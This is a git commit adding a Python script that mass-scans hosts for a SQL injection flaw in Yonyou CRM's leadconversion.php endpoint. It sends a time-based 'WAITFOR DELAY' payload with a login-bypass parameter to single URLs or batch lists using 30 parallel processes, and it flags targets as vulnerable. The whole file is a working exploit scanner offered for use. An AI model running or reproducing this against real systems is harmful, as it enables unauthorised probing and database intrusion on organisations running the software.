44ebfae276566902d85414406b3a0029bd744a5e
Sanandd <1365947417@qq.com>
2024-12-21 17:28:52 +0800

    Add files via upload

---
+++ yongy.py
@@ -0,0 +1,64 @@
+import requests
+import argparse
+
+requests.packages.urllib3.disable_warnings()
+from multiprocessing import Pool
+
+
+def main():
+    banner = """
+                                                                             
+                                                                             
+                                                                             
+                                                                             
+             ,---.        ,---,                        ,---.           ,--,  
+            '   ,'\   ,-+-. /  |  ,----._,.           '   ,'\        ,'_ /|  
+      .--, /   /   | ,--.'|'   | /   /  ' /     .--, /   /   |  .--. |  | :  
+    /_ ./|.   ; ,. :|   |  ,"' ||   :     |   /_ ./|.   ; ,. :,'_ /| :  . |  
+ , ' , ' :'   | |: :|   | /  | ||   | .\  ., ' , ' :'   | |: :|  ' | |  . .  
+/___/ \: |'   | .; :|   | |  | |.   ; ';  /___/ \: |'   | .; :|  | ' |  | |  
+ .  \  ' ||   :    ||   | |  |/ '   .   . |.  \  ' ||   :    |:  | : ;  ; |  
+  \  ;   : \   \  / |   | |--'   `---`-'| | \  ;   : \   \  / '  :  `--'   \ 
+   \  \  ;  `----'  |   |/       .'__/\_: |  \  \  ;  `----'  :  ,      .-./ 
+    :  \  \         '---'        |   :    :   :  \  \          `--`----'     
+     \  ' ;                       \   \  /     \  ' ;                        
+      `--`                         `--`-'       `--`                         
+"""
+    print(banner)
+    parser = argparse.ArgumentParser(description='yongyou')
+    parser.add_argument('-u','--url', type=str, help='输入要检测URL')
+    parser.add_argument('-f','--file', type=str, help='输入要批量检测的文本')
+    args = parser.parse_args()
+    url = args.url
+    file = args.file
+    targets = []
+    if url:
+        check(args.url)
+    elif file:
+        f = open(file, 'r')
+        for i in f.readlines():
+            i = i.strip()
+            if 'http' in i:
+                targets.append(i)
+            else:
+                i = f"http://{i}"
+                targets.append(i)
+    pool = Pool(30)
+    pool.map(check, targets)
+    pool.close()
+def check(target):
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
+    }
+    data = '''userid=1%27;WAITFOR+DELAY+%270:0:5%27--
+    '''
+    try:
+        response = requests.post(f'{target}/lead/leadconversion.php?DontCheckLogin=1&Action=getDeptName',headers=headers,data=data,verify=False,timeout=5)
+        if response.status_code == 200 and 'success' in response.text:
+            print(f"[!]{target}存在漏洞")
+        else:
+            print(f"[*]{target}不存在漏洞")
+    except Exception as e:
+        pass
+if __name__ == '__main__':
+    main()
